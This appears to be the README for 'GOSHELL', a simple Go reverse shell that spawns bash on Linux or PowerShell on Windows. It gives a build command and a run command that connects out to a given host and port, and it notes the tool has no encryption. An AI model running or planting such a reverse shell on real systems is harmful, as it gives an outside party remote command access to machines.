# GOSHELL

Simple golang based reverse shell. This calls `/bin/bash` on linux and `powershell.exe` on windows

## Build

```bash
make
```

## Run

```bash
./goshell-xxx-xx -host IP -port PORT
```

## Notes

This will not provide encryption or any other securiy measures - this is just a simple reverse shell. If you need something more advanced take a look at [Chisel](https://github.com/jpillora/chisel)
